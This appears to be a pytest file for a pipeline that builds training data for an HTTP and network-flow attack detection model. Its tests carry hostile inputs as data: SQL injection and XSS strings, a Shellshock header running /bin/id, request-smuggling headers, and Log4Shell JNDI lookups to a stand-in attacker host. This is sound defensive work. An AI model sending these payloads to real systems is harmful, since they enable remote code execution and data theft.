import json
import math
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from data_pipeline import generate as G  # noqa: E402
from data_pipeline.dedup_and_split import assign_splits, dedup, lineage_overlap  # noqa: E402
from data_pipeline.normalize import parse_http_blocks, parse_lines  # noqa: E402


def test_parse_lines_skips_comments_and_blanks():
    assert list(parse_lines("# hdr\n\n a \n---\nb\n// c\n")) == ["a", "b"]


def test_http_blocks_keep_framing_and_inner_blank_lines():
    raw = "POST / HTTP/1.1\nA: 1\nA: 2\n\n0\n\nX\n\n\nGET / HTTP/1.1\nB: 3\n"
    blocks = list(parse_http_blocks(raw))
    assert len(blocks) == 2 and blocks[0] == "POST / HTTP/1.1\nA: 1\nA: 2\n\n0\n\nX"


def test_raw_smuggling_wrap_preserves_duplicates_and_body():
    raw = "POST /x HTTP/1.1\nTransfer-Encoding: chunked\nTransfer-Encoding: identity\n\n0\n\nZ"
    tel, prov = G.wrap_http_raw({"id": "t", "payload": raw, "class": "http_request_smuggling"})
    hs = tel["http"]["headers"]
    assert [h for h in hs if h[0] == "Transfer-Encoding"] == [["Transfer-Encoding", "chunked"], ["Transfer-Encoding", "identity"]]
    assert hs[0][0] == "Host" and hs[0][1] in G.HOSTS and tel["http"]["target"] in G.ENDPOINTS  # pooled, not seed layout
    assert tel["http"]["body"] == "0\n\nZ" and prov == "hybrid"  # body = bytes after the header block, verbatim


def test_minimal_pair_twin_differs_only_in_value():
    seed = {"id": "s9", "class": "xss_reflected_stored", "payload": "<b>probe</b>"}
    a, _ = G.wrap_http(seed)
    b, _ = G.wrap_http(seed, twin=True)
    ha, hb = a["http"], b["http"]
    assert (ha["method"], ha["protocol"]) == (hb["method"], hb["protocol"])
    assert ha["headers"][0] == hb["headers"][0] and [k for k, _ in ha["headers"]] == [k for k, _ in hb["headers"]]
    assert "probe" in json.dumps(a) and "probe" not in json.dumps(b)


def test_haiku_style_fields_canonicalized():
    from subagents.orchestrator import canonicalize
    tel = {"schema_version": 1, "mode": "L7_HTTP", "decision_stage": "request_headers",
           "observed_until": "2026-10-14T08:00:00Z", "http": {"method": "GET", "target": "/", "protocol": "HTTP/2.0", "headers": []}}
    out = canonicalize(tel, "k")
    assert out["observed_until"] == "request_received" and out["http"]["protocol"] == "HTTP/2"


import yaml  # noqa: E402
VOCAB = set(yaml.safe_load(open(Path(__file__).parent.parent / "config/features.yaml"))["features"])


def test_flow_features_consistent():
    for cls in G.FLOW_PROFILES:
        for i in range(25):
            f = G.synth_flow(cls, i)[0]["flow"]["features"]
            assert all(math.isfinite(v) and v >= 0 for v in f.values()), cls
            assert f["duration_s"] > 0
            assert math.isclose(f["pkts_per_s"], f["pkts_total"] / f["duration_s"], rel_tol=1e-3)
            assert math.isclose(f["bytes_per_s"], f["bytes_total"] / f["duration_s"], rel_tol=1e-3)
            assert 0 <= f["tcp_flags_bitmask"] <= 255
            assert f["pkts_fwd"] + f["pkts_bwd"] == f["pkts_total"] and f.get("pkt_len_min", 0) <= f.get("pkt_len_max", 0)  # absent at NO_PKT_LEN_RATE
            assert set(f) <= VOCAB, set(f) - VOCAB


def _rec(cls, grp, content):
    return {"messages": [{}, {"content": content}, {}],
            "metadata": {"threat_type": cls, "lineage_group": grp}}


def test_groups_never_straddle_splits_and_dups_dropped():
    recs = [_rec(c, f"{c}:{g}", f"{c}{g}{k}") for c in ("a", "b") for g in range(10) for k in range(3)]
    recs.append(_rec("a", "a:0", "a00"))  # exact dup
    kept, dropped = dedup(recs)
    assert dropped == 1
    out = assign_splits(kept)
    assert not lineage_overlap(out)
    for c in ("a", "b"):
        got = {r["metadata"]["split"] for r in out if r["metadata"]["threat_type"] == c}
        assert got == {"train", "test", "val_select", "val_calib", "val_policy"}, got


def test_shortcut_hosts_neutralized():
    import random
    t, changed = G.neutralize_hosts("//evil.com/x https://app.attacker.example ok.org", random.Random(0))
    assert changed and "evil" not in t and "attacker" not in t and "ok.org" in t
    seed = {"id": "s1", "class": "open_redirect_cors", "payload": "https://evil.com"}
    tel, _ = G.wrap_http(seed)
    assert "evil" not in str(tel)


def test_observed_flow_mappers():
    from data_pipeline.flows import cic_features, nf_features, FLAG_BITS
    base = {"Flow Duration": 2_000_000, "Flow IAT Min": 5, "Flow IAT Mean": 10, "Flow IAT Max": 30,
            "Total Fwd Packets": 3, "Total Backward Packets": 1, "Total Length of Fwd Packets": 100,
            "Total Length of Bwd Packets": 0, "Packet Length Mean": 25, "Min Packet Length": 0,
            "Max Packet Length": 60, "Init_Win_bytes_forward": -1, "destination_port": 22,
            "protocol": "tcp", **{c: 0 for c in FLAG_BITS}, "SYN Flag Count": 1, "ACK Flag Count": 1}
    f, why = cic_features(base)
    assert why is None and f["duration_s"] == 2.0 and f["pkts_per_s"] == 2.0  # us -> s, recomputed rate
    assert f["tcp_flags_bitmask"] == 2 | 16                                   # presence flags -> bitmask
    assert set(f) <= VOCAB
    assert cic_features({**base, "Flow Duration": -1})[1] == "negative_or_nonfinite_duration"
    assert cic_features({**base, "Flow IAT Min": -3})[1] == "negative_iat"
    nf = {"FLOW_DURATION_MILLISECONDS": 0, "IN_PKTS": 2, "OUT_PKTS": 0, "IN_BYTES": 80, "OUT_BYTES": 0,
          "SHORTEST_FLOW_PKT": 40, "LONGEST_FLOW_PKT": 40, "TCP_FLAGS": 2, "L4_DST_PORT": 80, "PROTOCOL": 6,
          "MIN_TTL": 64, "MAX_TTL": 64, "RETRANSMITTED_IN_PKTS": 0, "RETRANSMITTED_OUT_PKTS": 0}
    f, why = nf_features(nf)
    assert why is None and f["duration_s"] == 0 and "pkts_per_s" not in f   # zero duration -> no rate
    assert set(f) <= VOCAB


def test_group_spanning_classes_stays_in_one_split():
    recs = [_rec(c, f"{c}:{g}", f"{c}{g}") for c in ("a", "b") for g in range(10)]
    recs += [_rec("a", "shared", "sa"), _rec("b", "shared", "sb")]  # one attacker, two classes
    out = assign_splits(dedup(recs)[0])
    assert not lineage_overlap(out)


def test_obfuscated_sqli_derivation():
    seeds = [{"id": f"s{i}", "class": "sqli_classic", "payload": p, "cluster": f"c{i}"}
             for i, p in enumerate(["' OR 1=1 -- ", "1 UNION SELECT null,version()", "admin'#"])]
    out = G.derive_obfuscated_sqli(seeds)
    assert out and all(o["payload"] != seeds[int(o["parent_id"][1:])]["payload"] for o in out)
    assert all(o["class"] == "sqli_obfuscated" and o["cluster"] == f"c{o['parent_id'][1:]}" for o in out)
    assert "s2" not in {o["parent_id"] for o in out}  # no SQL keyword -> no derivative


def test_request_builder_round_trip():
    import random
    from urllib.parse import unquote_plus
    r = random.Random(0)
    for sink in ("query", "form", "json", "cookie", "path"):
        tel = G.build_request(r, sink, "q", "a b'<x>%0d%0a", [["page", "2"]])
        h = tel["http"]
        if sink == "query":
            assert ["q", unquote_plus("a%20b'%3Cx%3E%0d%0a")] in h["query"] and "?" in h["target"]
            assert any(v["depth"] == 2 for v in h.get("decoded_views", [])) is False  # single layer only
        if sink in ("form", "json"):
            assert h["method"] in ("POST", "PUT") and tel["decision_stage"] == "request_headers_body"
            assert (["Content-Length", str(len(h["body"].encode()))] in h["headers"]
                    or (["Transfer-Encoding", "chunked"] in h["headers"]
                        and any(v["decoder"] == "chunked" for v in h["decoded_views"])))


def test_observed_and_synthetic_share_core_names():
    core = {"duration_s", "pkts_total", "bytes_total", "pkts_fwd", "pkts_bwd", "bytes_fwd", "bytes_bwd",
            "pkts_per_s", "bytes_per_s", "pkt_len_min", "pkt_len_max", "tcp_flags_bitmask", "dst_port", "ip_proto"}
    extras = {"iat_cv", "qname_len_mean", "qname_entropy_bits_per_char", "parent_domain_top_share", "ja4_ua_consistent",
              "h2_rst_stream_ratio", "h2_continuation_frames", "h2_rst_latency_ms_p50",
              "conn_count_60s", "distinct_dst_ports_60s"}  # window aggregates: CIC has them too (from timestamps)
    for cls in G.FLOW_PROFILES:
        assert set(G.synth_flow(cls, 0)[0]["flow"]["features"]) - core <= extras, cls


def test_cic_window_counts():
    import pandas as pd
    from data_pipeline.flows import add_window_counts
    df = pd.DataFrame({"flow_id": range(5), "source_ip": ["a"] * 4 + ["b"], "destination_ip": ["h"] * 5,
                       "destination_port": [22, 22, 21, 22, 22],
                       "Timestamp": ["03/07/2017 08:55:58", "3/7/2017 8:55", "03/07/2017 08:55:01",
                                     "03/07/2017 08:57:00", "bad"]})
    out = add_window_counts(df)
    assert out["conn_count_60s"].tolist()[:4] == [2, 2, 1, 1]          # same src/dst/port in the same minute
    assert out["distinct_dst_ports_60s"].tolist()[:3] == [2, 2, 2]      # ports 21 and 22 in that minute
    assert out["conn_count_60s"].isna().tolist()[4]                     # unparsable timestamp -> no count


def test_crs_fixture_to_telemetry():
    import json
    import jsonschema
    from data_pipeline.crs import telemetry
    inp = {"method": "POST", "uri": "/get?id=1&x=2", "version": "HTTP/1.1",
           "headers": {"Host": "localhost", "User-Agent": "OWASP CRS test agent", "Content-Type": "text/plain"},
           "data": "a=b"}
    tel = telemetry(inp, 942100, 1)
    jsonschema.validate(tel, json.load(open(Path(__file__).parent.parent / "schemas/telemetry.schema.json")))
    h = {k.lower(): v for k, v in tel["http"]["headers"]}
    assert h["host"] != "localhost" and "OWASP" not in h["user-agent"]   # test-harness headers normalized
    assert h["content-type"] == "text/plain" and tel["http"]["query"] == [["id", "1"], ["x", "2"]]
    assert tel["decision_stage"] == "request_headers_body"


def test_review_status_unanswered_is_not_agreed(tmp_path, monkeypatch):
    from subagents import review as R
    (tmp_path / "out").mkdir()
    key = tmp_path / "key.json"
    key.write_text(json.dumps({"r1": {"ref": "a:0"}, "r2": {"ref": "a:1"}, "r3": {"ref": "a:2"},
                               "r4": {"ref": "a:1"}, "r5": {"ref": "a:0"}}))  # r4, r5: recheck rounds
    (tmp_path / "out" / "batch_x.jsonl").write_text('{"rid": "r1"}\n{"rid": "r2"}\n{"rid": "r4"}\n')
    (tmp_path / "quarantine.json").write_text(json.dumps([{"rid": "r2", "ref": "a:1"}]))
    monkeypatch.setattr(R, "RV", tmp_path)
    monkeypatch.setattr(R, "KEY", key)
    # a:1 quarantined in round 1, cleared by the answered recheck r4; a:0's recheck r5 is unanswered -> r1 stands
    assert R.status() == {"a:0": "agreed", "a:1": "agreed", "a:2": "not_reviewed"}


def test_unseen_family_holdout_takes_whole_groups():
    from data_pipeline.dedup_and_split import holdout_unseen
    def rec(cls, fam, grp, gen="haiku-5.5"):
        return {"metadata": {"threat_type": cls, "template_family": f"{cls}:{fam}", "generator": gen,
                             "lineage_group": grp, "mechanism_tags": [], "provenance": "synthetic"}}
    recs = [rec("graphql_abuse", f"f{i}", f"g{i}") for i in range(10)]
    recs.append(rec("benign_standard_traffic", "f0_benign", "g0"))  # twin shares its attack's group
    out = holdout_unseen(recs, frac=0.2)
    assert len(out) == 2 and out <= {f"g{i}" for i in range(10)}
    assert holdout_unseen(recs[:2]) == set()  # fewer than 3 families: nothing held out


def test_ids2018_row_maps_through_cic_features():
    import pandas as pd
    from data_pipeline.flows import FLAG_BITS, IDS2018_RENAME, NUM_PROTO, cic_features
    row = {"Dst Port": 80, "Protocol": 6, "Flow Duration": 2_000_000, "Tot Fwd Pkts": 3, "Tot Bwd Pkts": 1,
           "TotLen Fwd Pkts": 300, "TotLen Bwd Pkts": 0, "Pkt Len Min": 0, "Pkt Len Max": 150, "Flow IAT Mean": 5.0,
           "Flow IAT Min": 1.0, "Label": "DoS attacks-Slowloris", **{k.replace("Count", "Cnt"): 0 for k in FLAG_BITS}}
    row["SYN Flag Cnt"] = 1
    r = pd.Series(row).rename(IDS2018_RENAME)
    r["protocol"] = NUM_PROTO[int(r["protocol"])]
    f, why = cic_features(r)
    assert why is None and f["duration_s"] == 2.0 and f["pkts_total"] == 4 and f["dst_port"] == 80
    assert f["tcp_flags_bitmask"] == 2 and f["ip_proto"] == 6 and "conn_count_60s" not in f  # no IPs -> no window count


def test_obfuscated_sql_seed_routing():
    from data_pipeline.normalize import is_obfuscated_sql
    for t in ("\\x27UNION SELECT", "'OR%0b1=1--", "x 0x730065006c00 exec(@q)", "UnIoN SeLeCt 1", "UN/**/ION SEL/**/ECT",
              "' or char(65)=char(65)"):
        assert is_obfuscated_sql(t), t
    for t in ('" OR "1"="1', "' or 1=1 --", "' UNION SELECT null--", "admin' -- ", "1 Union Select 1"):
        assert not is_obfuscated_sql(t), t
    from data_pipeline.normalize import sqli_seed_plain
    assert not is_obfuscated_sql(sqli_seed_plain("'))%20waitfor%20delay%20'0:0:20'%20--"))  # transport only
    assert is_obfuscated_sql(sqli_seed_plain("or%25201=1"))  # nested: a layer survives one decode


def test_flow_label_consistency():
    from data_pipeline.flows import CONSISTENT
    assert not CONSISTENT["syn_flood_ddos"]({"ip_proto": 6, "tcp_flags_bitmask": 16})  # ACK-only CIC-DDoS2019 "Syn"
    assert CONSISTENT["syn_flood_ddos"]({"ip_proto": 6, "tcp_flags_bitmask": 2})
    assert not CONSISTENT["udp_amplification"]({"ip_proto": 6})
    assert not CONSISTENT["udp_amplification"]({"ip_proto": 17, "pkts_fwd": 2, "pkts_bwd": 0})  # one-way spray
    assert not CONSISTENT["slowloris_slowhttp"]({"ip_proto": 6, "dst_port": 21})


def test_calibration_recovers_temperature_and_respects_hn_constraint():
    import numpy as np
    from eval.calibration import choose_tau, fit_temperature, softmax
    rng = np.random.default_rng(0)
    n, k, T_true = 4000, 6, 3.0
    logits = rng.normal(0, 2, (n, k))
    y = np.array([rng.choice(k, p=softmax(l)) for l in logits])
    assert abs(fit_temperature(logits * T_true, y) - T_true) < 0.25  # overconfident scores -> T near 3
    benign = np.array([True, True, False, False, False, False])
    hard_neg = np.array([False, True, False, False, False, False])
    tau, r = choose_tau(softmax(logits), y, benign, hard_neg, 0.01)
    assert r["hard_negative_false_intervention"] <= 0.01 and 0 <= tau <= 1


def test_make_args_builds_on_pinned_transformers(monkeypatch, tmp_path):
    # the notebook's TrainingArguments must construct on the pinned transformers (5.x renamed group_by_length)
    import inspect
    import transformers
    from training import colab_helpers as H
    real = set(inspect.signature(transformers.TrainingArguments.__init__).parameters)
    monkeypatch.setattr(H, "dtype_is_bf16", lambda: True)
    monkeypatch.setattr(transformers, "TrainingArguments", lambda **kw: kw)  # no GPU here: check names, not devices
    for b in (1, 2, 4):
        kw = H.make_args(str(tmp_path), 25, 10, smoke=True, per_device=b)
        assert set(kw) <= real, set(kw) - real
        assert kw["per_device_train_batch_size"] * kw["gradient_accumulation_steps"] == H.EFFECTIVE_BATCH


def test_unseen_source_holdout_smallest_big_source():
    from data_pipeline.dedup_and_split import holdout_unseen
    def rec(src, grp):
        return {"metadata": {"threat_type": "nosqli", "template_family": "nosqli_httpwrap", "generator": "deterministic",
                             "lineage_group": grp, "mechanism_tags": [f"src:{src}"], "provenance": "hybrid"}}
    recs = [rec("a", f"a{i}") for i in range(70)] + [rec("b", f"b{i}") for i in range(25)] + [rec("c", f"c{i}") for i in range(5)]
    out = holdout_unseen(recs, min_unseen=0)
    assert out == {f"b{i}" for i in range(25)}  # smallest source with >= 10% share; 'c' is too small to stand alone
    assert holdout_unseen(recs, max_source_out=0.2, min_unseen=0) == set()  # would pull 25% of the class: skipped
    # floor: with the source skipped, whole lineage groups go out by hash up to min_unseen, capped at max_source_out
    assert len(holdout_unseen(recs, max_source_out=0.2, min_unseen=15)) == 15
    assert len(holdout_unseen(recs, max_source_out=0.2, min_unseen=50)) == 20


def test_low_top_share_dns_exfil_survives_variant_holdout():
    # whichever variant the holdout takes, train keeps exfil with a benign-range parent_domain_top_share
    from data_pipeline.dedup_and_split import holdout_unseen
    variants = G.FLOW_PROFILES["dns_tunneling_exfil"]["variants"]
    low = {v["name"] for v in variants if v.get("dns_top", (1, 1))[1] <= G.DNS_NORMAL[2][1]}
    recs = [{"metadata": {"threat_type": "dns_tunneling_exfil", "template_family": "dns_tunneling_exfil_flow",
                          "generator": "deterministic", "lineage_group": f"{v['name']}{i}",
                          "mechanism_tags": [f"variant:{v['name']}"], "provenance": "synthetic"}}
            for v in variants for i in range(30)]
    out = holdout_unseen(recs, min_unseen=0)
    assert low - {g.rstrip("0123456789") for g in out}


def test_short_benign_downloads_survive_variant_holdout():
    # software_update_cdn (30-900 s full download) stays held out; train keeps a short full-download sibling
    from data_pipeline.dedup_and_split import holdout_unseen
    variants = G.FLOW_PROFILES["benign_high_rate_legit"]["variants"]
    short = {v["name"] for v in variants if v.get("window") == "full_flow" and v["dur"][0] < 300}
    recs = [{"metadata": {"threat_type": "benign_high_rate_legit", "template_family": "benign_high_rate_legit_flow",
                          "generator": "deterministic", "lineage_group": f"{v['name']}{i}",
                          "mechanism_tags": [f"variant:{v['name']}"], "provenance": "synthetic"}}
            for v in variants for i in range(30)]
    held = {g.rstrip("0123456789") for g in holdout_unseen(recs, min_unseen=0)}
    assert "software_update_cdn" in held and short - held


def test_generator_from_round_tag():
    from subagents.orchestrator import generator_of
    assert generator_of("benign_hard_negative_dev.vsn01.jsonl") == "sonnet-5.5"
    assert generator_of("ssti.vcx23.jsonl") == "codex-gpt-6.1-sol"
    assert generator_of("ssti.vs1w02.jsonl") == "haiku-5.5"
    assert generator_of("benign_standard_traffic.vgm44_path_traversal_lfi.jsonl") == "gemini-3.8-flash"


def test_apply_hn_never_demotes_attacks(tmp_path, monkeypatch):
    from subagents import review as R
    key = {"h0": {"label": "jwt_auth_bypass", "ref": "a:0"}, "h1": {"label": "benign_hard_negative_dev", "ref": "b:0"},
           "h2": {"label": "benign_standard_traffic", "ref": "c:0"}}
    (tmp_path / "out").mkdir()
    (tmp_path / "out" / "codex__batch_0.jsonl").write_text("".join(json.dumps({"rid": r, "predicted_class": p}) + "\n" for r, p in
        [("h0", "benign_standard_traffic"), ("h1", "benign_standard_traffic"), ("h2", "xxe")]))
    # a second reviewer agreeing with every label must not erase the first one's disputes (read order is arbitrary)
    (tmp_path / "out" / "gemini__batch_0.jsonl").write_text("".join(json.dumps({"rid": r, "predicted_class": p}) + "\n" for r, p in
        [("h0", "jwt_auth_bypass"), ("h1", "benign_standard_traffic"), ("h2", "benign_standard_traffic")]))
    (tmp_path / "key.json").write_text(json.dumps(key))
    monkeypatch.setattr(R, "XM", tmp_path)
    monkeypatch.setattr(R, "XM_KEY", tmp_path / "key.json")
    monkeypatch.setattr(R, "RELABEL", tmp_path / "relabel.json")
    R.apply_hn()
    assert json.loads((tmp_path / "relabel.json").read_text()) == {
        "a:0": "__quarantine__", "b:0": "benign_standard_traffic", "c:0": "__quarantine__"}
    (tmp_path / "relabel.json").unlink()  # reviewers split on a benign -> benign move: no relabel
    (tmp_path / "out" / "gemini__batch_0.jsonl").write_text(json.dumps({"rid": "h1", "predicted_class": "benign_hard_negative_dev"}) + "\n")
    R.apply_hn()
    assert "b:0" not in json.loads((tmp_path / "relabel.json").read_text())


def test_decoded_views_jwt_base64_and_limits():
    import base64
    from training.prepare import MAX_VIEWS, add_decoded_views
    b64 = lambda s: base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")
    jwt = b64('{"alg":"HS256"}') + "." + b64('{"sub":"a","sub":"b"}') + ".c2ln"
    tel = {"http": {"target": "/x", "headers": [["Authorization", "Bearer " + jwt]],
                    "query": [["q", base64.b64encode(b"<script>x</script>").decode()], ["sid", "a1b2c3d4e5f6a7b8c9d0e1f2"]]}}
    views = {(v["field"], v["decoder"]): v["value"] for v in add_decoded_views(tel)["http"]["decoded_views"]}
    assert views[("header.authorization", "jwt")] == '{"alg":"HS256"}.{"sub":"a","sub":"b"}'  # duplicate key kept
    assert views[("query.q", "base64")] == "<script>x</script>"
    assert ("query.sid", "base64") not in views  # decodes to binary: an ID, not text
    assert len(add_decoded_views(tel)["http"]["decoded_views"]) == len(views)  # idempotent
    many = {"http": {"target": "/", "query": [[f"k{i}", base64.b64encode(f"value number {i}".encode()).decode()] for i in range(20)]}}
    assert len(add_decoded_views(many)["http"]["decoded_views"]) == MAX_VIEWS


def test_base64_layer_round_trips_through_the_sensor_view():
    from training.prepare import add_decoded_views
    for sink in ("query", "form", "json", "multipart", "path", "cookie"):
        tel = add_decoded_views(G.build_request(G.rng_for("b64" + sink), sink, "q", "1' OR '1'='1", [], layer="base64"))
        assert any(v["decoder"] == "base64" and v["value"] == "1' OR '1'='1" for v in tel["http"]["decoded_views"]), sink


def test_truncation_augment_is_label_independent_and_well_formed():
    hits = 0
    for i in range(500):
        tel = G.build_request(G.rng_for(f"t{i}"), "query", "q", "x", [])
        out = G.truncation_augment(tel, f"rec:{i}")
        if out.get("truncated"):
            hits += 1
            ck = next(v for k, v in out["http"]["headers"] if k == "Cookie")
            full = "; ".join(f"{k}={v}" for k, v in out["http"]["cookies"])
            # contract 2 (prepare.SENSOR_CONTRACT): the rebuilt Cookie header is capped like any header
            assert ck == full[:512] and any(len(v) == 64 for _, v in out["http"]["cookies"])
    assert 5 <= hits <= 40  # ~TRUNC_RATE of 500, decided by the record id only (never by the class)


def test_budget_windows_collapse_padding_and_window_long_bodies():
    from training.prepare import budget_windows
    count = lambda t: len(json.dumps(t)) // 4  # stand-in tokenizer: 4 characters per token
    pad = {"http": {"target": "/f", "headers": [], "body": "q=" + "A" * 200_000 + " UNION SELECT pw FROM users"}}
    (w,) = budget_windows(pad, count)
    assert w["truncated"] and "UNION SELECT" in w["http"]["body"] and count(w) <= 2048
    text = " ".join(f"word{i}" for i in range(4000)) + " TAIL-MARK"
    ws = budget_windows({"http": {"target": "/f", "headers": [], "body": text}}, count)
    assert 1 < len(ws) <= 8 and all(count(x) <= 2048 for x in ws) and "TAIL-MARK" in ws[-1]["http"]["body"]


def test_canonicalize_replaces_attack_only_placeholder_hosts():
    from subagents.orchestrator import canonicalize
    tel = {"schema_version": 1, "mode": "L7_HTTP", "decision_stage": "request_received", "observed_until": "x",
           "http": {"protocol": "HTTP/1.1", "method": "GET", "path": "/a",
                    "headers": [["X-Api-Version", "${jndi:ldap://attacker.example/a}"]], "query": "u=%2F%2Fevil.example%2Fx"}}
    s = json.dumps(canonicalize(tel, "k1"))
    assert "attacker" not in s and "evil." not in s and "${jndi:ldap://" in s


def test_normalize_headers_keeps_payload_bearing_generic_headers():
    from subagents.orchestrator import normalize_headers
    tel = {"http": {"headers": [["Host", "x"], ["User-Agent", "${jndi:ldap://cdn.example.net/a}"], ["Accept", "*/*"],
                                ["Authorization", "Bearer t"], ["X-Fixture-Scanner", "nuclei-style"]]}}
    hs = normalize_headers(tel, "k")["http"]["headers"]
    assert [v for k, v in hs if k == "User-Agent"] == ["${jndi:ldap://cdn.example.net/a}"]
    assert ["Authorization", "Bearer t"] in hs and sum(k.lower() == "host" for k, _ in hs) == 1
    assert not any(k.lower().startswith("x-fixture") for k, _ in hs)
    plain = normalize_headers({"http": {"headers": [["User-Agent", "Mozilla/5.0 (X11; Linux x86_64)"]]}}, "k")
    assert "Mozilla/5.0 (X11; Linux x86_64)" not in [v for _, v in plain["http"]["headers"]]  # generic style replaced


def _obs(rid, cls, src, grp, split, oid):
    return {"id": rid, "metadata": {"threat_type": cls, "source": src, "provenance": "observed", "lineage_group": grp,
                                    "split": split, "original_id": str(oid)}}


def test_single_campaign_observed_class_trains_on_its_earlier_captures():
    from data_pipeline.block_split import block_campaigns, observed_per_split
    camp = "cic:172.16.0.1->192.168.10.50"  # one attacker host for every CIC-2017 attack class
    recs = [_obs(f"ps{i}", "port_scan_recon", "cic17", camp, "val_select", 100 - i) for i in range(10)]
    recs += [_obs(f"bf{i}", "credential_stuffing_bruteforce", "cic17", camp, "val_select", i) for i in range(5)]
    recs += [_obs(f"b{i}", "benign_standard_traffic", "cic17", f"h{i}", "train", i) for i in range(15)]
    recs += [_obs(f"sl{i}", "slowloris_slowhttp", "cic18", "c18", "train", i) for i in range(4)]  # already in train
    recs += [_obs(f"u{i}", "slowloris_slowhttp", "cic17", camp + "u", "test_unseen", i) for i in range(4)]  # unseen source
    moved = block_campaigns(recs)
    assert set(moved) == {"cic17/port_scan_recon", "cic17/credential_stuffing_bruteforce"}
    ps = sorted((r for r in recs if r["id"].startswith("ps")), key=lambda r: int(r["metadata"]["original_id"]))
    assert [r["metadata"]["split"] for r in ps] == ["train"] * 8 + ["val_select"] * 2  # the latest 20% held out
    assert ps[0]["metadata"]["lineage_group"].endswith("#port_scan_recon#early")
    assert ps[-1]["metadata"]["lineage_group"].endswith("#port_scan_recon#late")
    assert all(r["metadata"]["split"] == "test_unseen" for r in recs if r["id"].startswith("u"))
    assert all(r["metadata"]["split"] == "train" for r in recs if r["id"].startswith("sl"))
    assert observed_per_split(recs)["cic17"]["train"] == {"attack": 12, "benign": 15}
    # every group in one split (the blocks are separate groups)
    where = {}
    for r in recs:
        where.setdefault(r["metadata"]["lineage_group"], set()).add(r["metadata"]["split"])
    assert all(len(v) == 1 for v in where.values())


def test_unseen_source_leaves_train_with_its_benign_flows():
    from data_pipeline.block_split import align_unseen_sources
    recs = [_obs(f"a{i}", "slowloris_slowhttp", "cic18", "c18", "test_unseen", i) for i in range(3)]
    recs += [_obs(f"b{i}", "benign_standard_traffic", "cic18", f"g{i % 2}", "train", i) for i in range(4)]
    recs += [_obs(f"c{i}", "benign_standard_traffic", "cic17", f"k{i}", "train", i) for i in range(2)]
    recs += [_obs("d0", "port_scan_recon", "cic17", "k9", "train", 0)]
    assert align_unseen_sources(recs) == {"cic18": 4}
    assert all(r["metadata"]["split"] == "test_unseen" for r in recs if r["id"].startswith("b"))
    assert all(r["metadata"]["split"] == "train" for r in recs if r["id"][0] in "cd")


def test_header_sink_places_raw_values_and_keeps_layers_visible():
    import base64
    from training.prepare import add_decoded_views
    r = G.rng_for("hdr1")
    tel = G.build_request(r, "header", "User-Agent", "() { :; }; /bin/id\r\nX: y", [["page", "2"]])
    h = tel["http"]
    uas = [v for k, v in h["headers"] if k.lower() == "user-agent"]
    assert uas == ["() { :; }; /bin/id%0d%0aX: y"]  # replaces the client's UA; no raw line break inside a header
    assert h["query"] == [["page", "2"]] and h["body"] is None and tel["decision_stage"] == "request_headers"
    tel = G.build_request(G.rng_for("hdr2"), "header", "X-Api-Version", "${jndi:ldap://h/a}", [], layer="double_url")
    assert ["X-Api-Version", "%24%7Bjndi%3Aldap%3A%2F%2Fh%2Fa%7D"] in tel["http"]["headers"]
    assert {"field": "header.x-api-version", "decoder": "url", "depth": 1, "value": "${jndi:ldap://h/a}"} in tel["http"]["decoded_views"]
    tel = add_decoded_views(G.build_request(G.rng_for("hdr3"), "header", "X-Client-Ref", "1' OR '1'='1", [], layer="base64"))
    assert ["X-Client-Ref", base64.b64encode(b"1' OR '1'='1").decode()] in tel["http"]["headers"]
    assert any(v["field"] == "header.x-client-ref" and v["decoder"] == "base64" and v["value"] == "1' OR '1'='1"
               for v in tel["http"]["decoded_views"])  # the sensor view reads header values too


def test_header_sink_twins_and_benign_share_the_header_names():
    from data_pipeline.mechanisms import tags
    seen_attack, seen_benign = set(), set()
    for i in range(400):
        seed = {"id": f"hs{i}", "class": "xss_reflected_stored", "payload": "<svg onload=alert(1)>"}
        info = {}
        a, _ = G.wrap_http(seed, info=info)
        if info["sink"] != "header":
            continue
        b, _ = G.wrap_http(seed, twin=True)
        names_a = [k for k, _ in a["http"]["headers"]]
        assert names_a == [k for k, _ in b["http"]["headers"]]  # minimal pair: same header layout
        from training.prepare import add_decoded_views
        a, b = add_decoded_views(a), add_decoded_views(b)  # a URL / Base64 layer is read through the sensor view
        assert "<svg" in json.dumps(a) and "<svg" not in json.dumps(b)
        extra = [k for k in names_a if k not in ("Host",)]
        seen_attack |= {k for k in extra if k in G.HEADER_SINKS or k.startswith("X-")}
        assert "loc:header" in tags(a, {"sink": "header"}, {})
    for i in range(600):
        tel, sc = G.synth_benign_http("benign_standard_traffic", i)
        if sc["sink"] == "header":
            seen_benign |= {k for k, _ in tel["http"]["headers"] if k in G.HEADER_SINKS or k.startswith("X-")}
            assert "loc:header" in tags(tel, {"scenario": sc}, {})
    assert seen_attack and seen_benign
    named = {"User-Agent", "X-Forwarded-For", "X-Api-Version", "X-Client-Ref", "X-Device-Id"}
    assert named & seen_attack == named & seen_benign  # no header name that only attacks use


def _many_cookies(n):
    cookies = [[f"analytics_cookie_{i:02d}", "v" * 40] for i in range(n)]
    return {"schema_version": 1, "mode": "L7_HTTP", "http": {
        "method": "GET", "target": "/home", "headers": [["Host", "a.example"], ["Cookie", "; ".join(f"{k}={v}" for k, v in cookies)]],
        "query": None, "cookies": cookies, "body": None}}


def test_contract_2_caps_the_cookie_header_and_drops_cookies_beyond_48():
    from training.prepare import MAX_COOKIES, fit_budget
    count = lambda t: len(json.dumps(t)) // 4  # noqa: E731
    tel = _many_cookies(89)  # open-appsec browsing: ~72 cookies per request, max 89
    one = fit_budget(tel, count, 10**6, contract=1)
    cookie1 = next(v for k, v in one["http"]["headers"] if k == "Cookie")
    assert cookie1.count("analytics_cookie_") == 89 and "cookies_truncated" not in one["http"]  # contract 1: full header
    two = fit_budget(tel, count, 10**6, contract=2)
    assert len(next(v for k, v in two["http"]["headers"] if k == "Cookie")) <= 512 and len(two["http"]["cookies"]) == 89
    # a budget only the cookie-dropping level meets: unfittable under contract 1
    tight = count(fit_budget(tel, count, 10**6, contract=2) | {}) - 1
    while fit_budget(tel, count, tight, contract=2) and fit_budget(tel, count, tight, contract=2)["http"].get("cookies_truncated") is None:
        tight -= 20
    last = fit_budget(tel, count, tight, contract=2)
    assert last is not None and fit_budget(tel, count, tight, contract=1) is None
    assert len(last["http"]["cookies"]) == MAX_COOKIES and last["http"]["cookies_truncated"] == 89 - MAX_COOKIES
    assert last["truncated"] is True and count(last) <= tight


def test_contract_2_truncation_records_carry_the_new_key_in_every_class():
    from training.prepare import MAX_COOKIES
    hits = {"attack": 0, "benign": 0}
    for i in range(4000):
